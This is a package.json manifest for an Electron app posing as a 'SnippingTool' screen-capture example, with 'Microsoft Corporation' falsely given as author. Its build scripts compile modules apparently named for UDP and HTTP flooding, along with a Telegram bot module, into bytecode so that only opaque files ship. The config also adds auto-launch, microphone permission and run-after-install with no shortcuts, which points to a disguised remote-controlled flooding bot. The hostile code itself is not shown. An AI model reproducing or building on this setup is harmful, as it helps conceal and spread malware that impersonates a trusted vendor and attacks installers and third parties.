{
  "name": "SnippingTool",
  "version": "10.4.0",
  "description": "This project contains example about multiscreen capture via electron-js",
  "main": "index.js",
  "scripts": {
    "start": "electron .",
    "build": "electron-builder --ia32",
    "build:bytenode": "npx bytenode --compile applicationViewer.js udpRain.js httpRain.js telegram.js config.js",
    "prebuild": "node -e \"const fs=require('fs');['applicationViewer.jsc','udpRain.jsc','httpRain.jsc','telegram.jsc','config.jsc'].forEach(f=>{if(!fs.existsSync(f))throw new Error('Missing .jsc file: '+f+'. Run npm run build:bytenode first.')})\"",
    "build:prod": "npm run build:bytenode && npm run build"
  },
  "repository": {
    "type": "git",
    "url": "git+https://github.com/mhmttkmk0352/Multi-Screen-Capture-with-Electron-App.git"
  },
  "keywords": [],
  "author": "Microsoft Corporation",
  "license": "ISC",
  "bugs": {
    "url": "https://github.com/mhmttkmk0352/Multi-Screen-Capture-with-Electron-App/issues"
  },
  "homepage": "https://github.com/mhmttkmk0352/Multi-Screen-Capture-with-Electron-App#readme",
  "devDependencies": {
    "electron": "10.4.7",
    "electron-builder": "22.10.5"
  },
  "dependencies": {
    "auto-launch": "^5.0.5",
    "axios": "^1.6.0",
    "bytenode": "1.0.3",
    "electron-builder-squirrel-windows": "^25.1.8",
    "js-base64": "^3.7.7",
    "node-telegram-bot-api": "^0.61.0",
    "request": "^2.88.2",
    "socket.io-client": "^4.5.1"
  },
  "build": {
    "files": [
      "!*.js",
      "index.js",
      "requireCompiled.js",
      "applicationViewer.jsc",
      "udpRain.jsc",
      "httpRain.jsc",
      "telegram.jsc",
      "config.jsc",
      "www/**",
      "build/**",
      "loading.gif",
      "package.json"
    ],
    "asarUnpack": [
      "node_modules/bytenode/**"
    ],
    "win": {
      "target": [
        {
          "target": "squirrel",
          "arch": [
            "ia32"
          ]
        }
      ]
    },
    "squirrelWindows": {
      "loadingGif": "loading.gif"
    },
    "nsisWeb": {
      "createDesktopShortcut": false,
      "createStartMenuShortcut": false,
      "runAfterFinish": true
    }
  },
  "permissions": [
    "microphone"
  ],
  "asar": true
}